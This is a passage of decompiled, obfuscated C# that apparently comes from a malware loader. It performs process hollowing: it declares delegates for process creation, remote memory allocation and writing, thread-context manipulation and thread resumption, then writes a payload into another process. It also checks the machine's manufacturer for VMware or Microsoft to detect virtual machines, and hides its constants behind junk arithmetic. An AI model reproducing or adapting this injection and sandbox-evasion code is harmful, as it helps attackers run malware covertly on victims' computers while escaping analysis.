          int num13 = ContinueWithIsRightKind.CreateDirectory(aoFncppgdri.ValidOn, lpBaseAddress + num11, lpBuffer2, lpBuffer2.Length, out lpNumberOfBytesWritten) ? 1 : 0;
        }
        num8 += (Convert.ToInt32(-209697.0 - -69899.0) + Convert.ToInt32(56105.680185865582 - Math.Tan(28053.5)) / \u003CModule\u003E.Run(int.Parse("6")) + Convert.ToInt32(83731.594222208485 - Math.Sin(41865.5)) / \u003CModule\u003E.Run(int.Parse("5"))) * (Convert.ToInt32(23917.0 + Math.Tanh(11959.0)) / \u003CModule\u003E.Run(int.Parse("10")) + Convert.ToInt32(2.0 * 21471.5) / \u003CModule\u003E.Run(int.Parse("2")) - Convert.ToInt32(66860.951545456061 + Math.Cos(33430.0)) / \u003CModule\u003E.Run(int.Parse("11")));
        num10 += Convert.ToInt32(32478.429123022885 - Math.Sin(16239.5)) / \u003CModule\u003E.Run(int.Parse("2")) + Convert.ToInt32(93673.5 - 31224.5) / \u003CModule\u003E.Run(int.Parse("4")) - Convert.ToInt32(94922.323640239687 + Math.Log10(47463.5)) / \u003CModule\u003E.Run(int.Parse("12"));
      }
      while (num10 <= (int) num9 - (Convert.ToInt32(-51061.5 - -17020.5) + Convert.ToInt32(44880.0 + Math.Ceiling(44880.0)) / \u003CModule\u003E.Run(int.Parse("14")) - (int.Parse("1766516237") ^ int.Parse("1766473643")) / \u003CModule\u003E.Run(int.Parse("5"))));
      byte[] lpBuffer3 = \u003CModule\u003E.óÈJ_\u0099(lpBaseAddress);
      int num14 = ContinueWithIsRightKind.CreateDirectory(aoFncppgdri.ValidOn, num5 + (Convert.ToInt32(6030326020.5 / -54910.5) + (int.Parse("463124549") ^ int.Parse("463102384")) / \u003CModule\u003E.Run(int.Parse("6")) + Convert.ToInt32(54036.431621047625 - Math.Log10(27016.0)) / \u003CModule\u003E.Run(int.Parse("10"))) * (Convert.ToInt32(30934.11688039908 - Math.Sqrt(15405.0)) / \u003CModule\u003E.Run(int.Parse("3")) + Convert.ToInt32(14189.705967445165 - Math.Sin(7094.5)) / \u003CModule\u003E.Run(int.Parse("2")) - Convert.ToInt32(1012410002.0 / 22499.0) / \u003CModule\u003E.Run(int.Parse("6"))), lpBuffer3, (Convert.ToInt32(-195216.0 - -65072.0) + Convert.ToInt32(116160.0 - 38720.0) / \u003CModule\u003E.Run(int.Parse("10")) + Convert.ToInt32(2.0 * 26354.0) / \u003CModule\u003E.Run(int.Parse("6"))) * (Convert.ToInt32(-86845.0 - 86845.0) + Convert.ToInt32(42583.0 + Math.Ceiling(42583.5)) / \u003CModule\u003E.Run(int.Parse("4")) + Convert.ToInt32(88525.0 - Math.Tanh(44262.0)) / \u003CModule\u003E.Run(int.Parse("6"))), out lpNumberOfBytesWritten) ? 1 : 0;
      int num15 = \u003CModule\u003E.e\u00BDTjô(_param2, num1 + (Convert.ToInt32(371608322.0 / -13631.0) + Convert.ToInt32(59300.344273226132 + Math.Sin(29650.0)) / \u003CModule\u003E.Run(int.Parse("4")) - Convert.ToInt32(31997.0 + Math.Tanh(15999.0)) / \u003CModule\u003E.Run(int.Parse("13"))) * ((int.Parse("-1219021829") ^ int.Parse("1218993422")) + Convert.ToInt32(123077.0 - Math.Round(41025.5)) / \u003CModule\u003E.Run(int.Parse("9")) - Convert.ToInt32(44908.980531033754 + Math.Log(22459.5)) / \u003CModule\u003E.Run(int.Parse("1"))));
      if (flag)
        lpBaseAddress = num2;
      context[(Convert.ToInt32(-29161.5 - -9720.5) + Convert.ToInt32(96245.303143968544 + Math.Tan(48122.0)) / \u003CModule\u003E.Run(int.Parse("2")) - Convert.ToInt32(76754.415900687454 + Math.Log10(38379.5)) / \u003CModule\u003E.Run(int.Parse("12"))) * (Convert.ToInt32(-194884.5 - -64961.5) + Convert.ToInt32(2.0 * 16129.0) / \u003CModule\u003E.Run(int.Parse("4")) + Convert.ToInt32(97655.2038384072 + Math.Log(48833.0)) / \u003CModule\u003E.Run(int.Parse("9")))] = lpBaseAddress + num15;
      \u003CModule\u003E.J7Ém\u0098(((int.Parse("-162639394") ^ int.Parse("162647867")) + Convert.ToInt32(45138.973700298993 + Math.Tan(22570.0)) / \u003CModule\u003E.Run(int.Parse("12")) - Convert.ToInt32(9891.0 + Math.Floor(9890.5)) / \u003CModule\u003E.Run(int.Parse("7"))) * (Convert.ToInt32(2.0 * -15904.0) + (int.Parse("148308") ^ int.Parse("161260")) / \u003CModule\u003E.Run(int.Parse("11")) + Convert.ToInt32(17800.0 + Math.Tanh(8900.5)) / \u003CModule\u003E.Run(int.Parse("3"))));
      if (\u003CModule\u003E.\u0033ûÅj\u00B4() != (Convert.ToInt32(45824.0 - Math.Ceiling(15274.5)) / \u003CModule\u003E.Run(int.Parse("5")) + Convert.ToInt32(30245.0 + 30245.0) / \u003CModule\u003E.Run(int.Parse("12")) - Convert.ToInt32(136553.0 - Math.Round(45517.5)) / \u003CModule\u003E.Run(int.Parse("11"))) * (Convert.ToInt32(1583212720.5 / -28135.5) + Convert.ToInt32(58219.0 + Math.Tanh(29110.0)) / \u003CModule\u003E.Run(int.Parse("3")) - Convert.ToInt32(1954.8814113036426 - Math.Log(974.0)) / \u003CModule\u003E.Run(int.Parse("11"))))
      {
        int num16 = ContinueWithIsRightKind.Get_IsEvent(aoFncppgdri.DoDemand, context) ? 1 : 0;
      }
      else
      {
        int num17 = ContinueWithIsRightKind.RawConstantRow(aoFncppgdri.DoDemand, context) ? 1 : 0;
      }
      int num18 = (int) ContinueWithIsRightKind.CopyToManaged(aoFncppgdri.DoDemand);
      ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator = (ManagementObjectCollection.ManagementObjectEnumerator) \u003CModule\u003E.ÿ\u00AC\u00BDÝF(\u003CModule\u003E.\u0024Ìî\u005C\u009B(\u003CModule\u003E.u\u000F\u0022\u0021\u003E("Select * from Win32_ComputerSystem")));
      try
      {
        while (\u003CModule\u003E._í\u009E\u007BÂ((object) objectEnumerator))
        {
          ManagementBaseObject managementBaseObject = (ManagementBaseObject) \u003CModule\u003E.\u0002Hÿg\u0002((object) objectEnumerator);
          string str = \u003CModule\u003E.ß\u0005ü\u002Aû((object) \u003CModule\u003E.\u00A1\u003Aò\u00A1\u00BF(\u003CModule\u003E.\u00AEm\u001D\u003EÁ((object) managementBaseObject, "Manufacturer")));
          if (!\u003CModule\u003E.\u00A7qM\u000BK((object) str, "microsoft corporation"))
          {
            int num19 = \u003CModule\u003E.\u00A7qM\u000BK((object) str, "vmware") ? 1 : 0;
          }
        }
      }
      finally
      {
        if (objectEnumerator != null)
          \u003CModule\u003E.Pl\u0007\u007D\u009B((object) objectEnumerator);
      }
      return (int.Parse("-2126231583") ^ int.Parse("2126062778")) + Convert.ToInt32(72483.087369485 - Math.Tan(36241.5)) / \u003CModule\u003E.Run(int.Parse("2")) + Convert.ToInt32(148036.0 - Math.Floor(49345.5)) / \u003CModule\u003E.Run(int.Parse("13")) != 0;
    }
    catch (Exception ex)
    {
      \u003CModule\u003E.î\u0023ETq(\u003CModule\u003E.\u00A1\u003Aò\u00A1\u00BF((object) ex));
      \u003CModule\u003E.\u0027ÿ\u0013ÏW(\u003CModule\u003E.\u0022\u0001ÍÌ\u0096(\u003CModule\u003E.\u0022øçÑI(aoFncppgdri.GetStartOffset)));
      return Convert.ToInt32(-7687.5 - 7687.5) + Convert.ToInt32(48428.0 + Math.Floor(48427.5)) / \u003CModule\u003E.Run(int.Parse("10")) - Convert.ToInt32(40740.0 + 40740.0) / \u003CModule\u003E.Run(int.Parse("9")) + Type.EmptyTypes.Length - Type.EmptyTypes.Length != 0;
    }
  }

  public delegate void BestFitMask();

  public delegate double ZeroMemory(int p, byte b, short s);

  public delegate void S_PARAMSLOT();

  public delegate double InitializeFrom(int p, byte b, short s);

  public delegate bool NamedPermissionSet(IntPtr thread, int[] context);

  public delegate bool Identifier(IntPtr thread, int[] context);

  public delegate bool Get_ClassSize(
    IntPtr hProcess,
    int lpBaseAddress,
    int lpBuffer,
    int dwSize,
    ref int lpNumberOfBytesRead);

  public delegate int Op_Multiply(
    IntPtr hProcess,
    IntPtr lpAddress,
    uint dwSize,
    uint flAllocationType,
    uint flProtect);

  public delegate bool RunWorkerAsync(
    IntPtr hProcess,
    int lpBaseAddress,
    byte[] lpBuffer,
    int nSize,
    out int lpNumberOfBytesWritten);

  public delegate bool SystemWebDynamicDataDesign(IntPtr thread, int[] context);

  public delegate bool MarkLabel(IntPtr thread, int[] context);

  public delegate uint Notation(IntPtr hThread);

  public delegate bool IsUnmanaged(
    IntPtr hToken,
    string lpApplicationName,
    string lpCommandLine,
    IntPtr lpProcessAttributes,
    IntPtr lpThreadAttributes,
    bool bInheritHandles,
    uint dwCreationFlags,
    IntPtr lpEnvironment,
    string lpCurrentDirectory,
    ref ContinueWithIsRightKind.GetHashCode_TypeNamespace startupInfo,
    ref ContinueWithIsRightKind.CreateSymbolReader aoFncppgdri);

  public struct CreateSymbolReader
  {
    public readonly IntPtr ValidOn;
    public readonly IntPtr DoDemand;
    public readonly uint GetStartOffset;
    private readonly uint _appendStart;
  }

  public struct GetHashCode_TypeNamespace
  {
    public uint Get_Issuer;
    private readonly string FromFileTimeUtc;
    private readonly string ReadColumn;
    private readonly string TASK_STATE_CANCELLATIONACKNOWLEDGED;
    private readonly byte[] ReadElementByRID;
    private readonly IntPtr S_ActionToActionObjShunt;
    private readonly IntPtr MethodSpec;
    private readonly IntPtr ToWriterOffset;
    private readonly IntPtr _keyPairExported;
  }
}
